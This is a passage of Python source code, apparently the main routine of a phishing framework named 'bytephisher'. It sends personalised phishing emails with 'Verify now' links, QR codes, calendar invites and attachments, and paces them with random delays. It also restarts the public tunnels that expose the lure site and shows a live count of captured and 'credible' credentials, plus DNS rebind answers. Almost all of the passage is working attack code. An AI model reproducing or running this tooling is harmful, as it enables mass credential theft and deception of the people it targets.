                    _pretexts.get(args.pretext)
                except KeyError as e:
                    print(f"[bytephisher] pretext : {e}")
                    return 2
                ctx["Brand"] = args.mail_from_name
                missing = _pretexts.missing_fields(args.pretext, ctx)
                if missing:
                    print(f"[bytephisher] pretext : {args.pretext} needs "
                          f"{', '.join(missing)} - pass them via the target list or a "
                          "template context")
                subject, body = _pretexts.render(args.pretext, ctx)
                print(f"[bytephisher] pretext : {args.pretext} ({_pretexts.get(args.pretext)['tell']})")
            else:
                subject, body = render(args.mail_template, ctx)

            def _mime_for(path):
                ext = os.path.splitext(path)[1].lower()
                return {".ics": "text/calendar", ".html": "text/html", ".htm": "text/html",
                        ".svg": "image/svg+xml", ".pdf": "application/pdf",
                        ".png": "image/png", ".jpg": "image/jpeg", ".jpeg": "image/jpeg",
                        ".xlsx": "application/vnd.openxmlformats-officedocument."
                                 "spreadsheetml.sheet",
                        ".docx": "application/vnd.openxmlformats-officedocument."
                                 "wordprocessingml.document",
                        ".zip": "application/zip"}.get(ext, "application/octet-stream")

            attachments = []
            for path in [p.strip() for p in (args.mail_attach or "").split(",") if p.strip()]:
                try:
                    with open(path, "rb") as fh:
                        attachments.append((os.path.basename(path), fh.read(), _mime_for(path)))
                except OSError as e:
                    print(f"[bytephisher] mail attach skipped ({path}): {e}")
            if args.mail_ics:
                from core import ics as ics_mod
                ical = ics_mod.invite(f"{args.campaign or 'campaign'}-{int(time.time())}@bh.local",
                                      subject, link,
                                      description=f"Agenda and the shared sheet: {link}",
                                      organizer=smtp.get("user", ""),
                                      attendees=[])
                attachments.append(("invite.ics", ical, "text/calendar"))
            inline = [qr_image(link)] if args.mail_qr else []
            min_delay, max_delay = 0.0, 0.0
            if args.mail_pacing:
                try:
                    lo, _, hi = args.mail_pacing.partition("-")
                    min_delay = float(lo or 0)
                    max_delay = float(hi or lo or 0)
                except ValueError:
                    print(f"[bytephisher] --mail-pacing {args.mail_pacing!r} is not "
                          "MIN-MAX - sending without pacing")
            recipients = [a.strip() for a in args.mailto.split(",") if a.strip()]
            sent = failed = 0
            for index, addr in enumerate(recipients):
                hit = targets_store.by_email(addr) if targets_store else None
                if hit is not None:
                    ctx.update(hit.context(Brand=args.mail_from_name))
                else:
                    ctx["To_Address"] = addr
                    ctx["To_FirstName"] = addr.split("@")[0].split(".")[0].title()
                if args.pretext:
                    s2, b2 = _pretexts.render(args.pretext, ctx)
                else:
                    s2, b2 = render(args.mail_template, ctx)
                html_body = to_html(b2, base=link, cta_label="Verify now")
                if inline:
                    html_body = html_body.replace("</body>", qr_html(link) + "</body>")
                if index and (min_delay or max_delay):
                    lo = min(min_delay, max_delay)
                    hi = max(min_delay, max_delay)
                    time.sleep(random.uniform(lo, hi))
                try:
                    send_smtp(smtp["host"], int(smtp.get("port", 587)), smtp.get("user", ""),
                              smtp.get("pass", ""), s2, html_body, addr,
                              use_starttls=bool(smtp.get("use_starttls", True)), html=True,
                              from_name=args.mail_from_name,
                              reply_to=args.mail_reply_to,
                              to_name=args.mail_to_name or ctx["To_FirstName"],
                              in_reply_to=args.mail_thread,
                              references=args.mail_thread,
                              attachments=attachments, inline_images=inline)
                    sent += 1
                    extra = []
                    if inline:
                        extra.append("QR")
                    if attachments:
                        extra.append(f"{len(attachments)} attachment(s)")
                    print(f"[bytephisher] email sent -> {addr}"
                          + (f"  [{' + '.join(extra)}]" if extra else ""))
                except Exception as e:
                    failed += 1
                    print(f"[bytephisher] email failed for {addr}: {type(e).__name__}: {e}")
            if recipients:
                print(f"[bytephisher] mail     : {sent} sent, {failed} failed"
                      + (f", paced {min_delay:g}-{max_delay:g}s" if min_delay or max_delay else ""))

    # --- live loop ---
    def _sig(_s, _f):
        stop["flag"] = True
    signal.signal(signal.SIGINT, _sig)
    signal.signal(signal.SIGTERM, _sig)

    t0 = time.time()
    warned_dead = set()
    restarts = {}

    def _tunnel_watchdog():
        """Warn loudly if a tunneler dies mid-campaign: the public URL it
        produced is dead, and a silent dead link wastes a whole campaign.
        With --tunnel-restart, bring it back and print the new URL."""
        try:
            from tunnels import dead_names, run_one
            dead = set(dead_names())
        except Exception:
            return
        new = dead - warned_dead
        for name in sorted(new):
            warned_dead.add(name)
            print(f"\n[bytephisher] WARNING: tunneler '{name}' exited - "
                  f"its public URL is dead.", flush=True)
            if not args.tunnel_restart:
                print("[bytephisher] tip: --tunnel-restart brings it back automatically\n",
                      flush=True)
                continue
            restarts[name] = restarts.get(name, 0) + 1
            if restarts[name] > 5:
                print(f"[bytephisher] '{name}' already restarted 5 times - giving up "
                      f"on it (use -t all for fallbacks)\n", flush=True)
                continue
            print(f"[bytephisher] restarting '{name}' "
                  f"(attempt {restarts[name]}/5) ...", flush=True)
            try:
                new_url = run_one(name, port)
            except Exception as e:
                new_url = None
                print(f"[bytephisher] restart raised {type(e).__name__}: {e}", flush=True)
            if new_url:
                urls[name] = new_url
                if args.proxy and live_urls():
                    engine.public_host = urllib.parse.urlparse(live_urls()[0]).netloc
                # allow the watchdog to notice if the NEW tunnel dies later
                warned_dead.discard(name)
                print(f"[bytephisher] '{name}' is back: {new_url}\n", flush=True)
            else:
                print(f"[bytephisher] '{name}' did not come back - "
                      f"use another tunnel (e.g. -t all)\n", flush=True)

    try:
        if args.no_tui or not sys.stdout.isatty():
            from dashboard import render_plain
            last_check = time.time()
            while not stop["flag"]:
                print("\033[2J\033[H", end="")   # ANSI clear (no TERM dependency)
                render_plain(db.all(40), db.stats())
                print("\n[ctrl+c to stop]")
                if urls and time.time() - last_check > 10:
                    _tunnel_watchdog()
                    last_check = time.time()
                time.sleep(3)
        else:
            from dashboard import live_loop
            live_loop(db, stop, refresh=1.5, watchdog=_tunnel_watchdog if urls else None)
    except KeyboardInterrupt:
        pass
    finally:
        runtime = int(time.time() - t0)
        stats = db.stats()
        print("\n" + "=" * 62)
        print("  BYTEPHISHER SESSION SUMMARY")
        print("=" * 62)
        print(f"  runtime            : {runtime // 60}m {runtime % 60}s")
        print(f"  total captures     : {stats['total_captures']}")
        print(f"  credential captures: {stats['credentials']}")
        print(f"  credible (low risk): {stats.get('credible_credentials', 0)}")
        print(f"  unique visitors    : {stats['visitors']}")
        try:
            bs = db.blocked_stats()
            if bs["total_blocked"]:
                print(f"  gated out          : {bs['total_blocked']}")
        except Exception:
            pass
        if urls:
            print("  public urls:")
            for n, u in urls.items():
                if u:
                    print(f"    {n:<14} {u}")
        print("=" * 62)
        with contextlib.suppress(Exception):
            httpd.shutdown()
        from tunnels import stop_all
        killed = stop_all()
        if killed:
            print(f"  tunnels stopped    : {killed}")
        with contextlib.suppress(Exception):
            db.close()
        if rebind_srv is not None:
            with contextlib.suppress(Exception):
                rebind_srv.stop()
            rows = rebind_srv.summary(limit=8)
            if rows:
                print(f"  rebind answers     : {len(rebind_srv.log)} "
                      f"(last: {rows[-1]['name']} -> {rows[-1]['answer']})")
    return 0


def _run():
    """main(), with a quiet exit when the reader closes the pipe.

    `bytephisher.py --lures | head` printed a BrokenPipeError traceback.
    """
    try:
        return main()
    except BrokenPipeError:
        with contextlib.suppress(Exception):
            sys.stdout.close()
        return 0
    except KeyboardInterrupt:
        return 130


if __name__ == "__main__":
    sys.exit(_run())
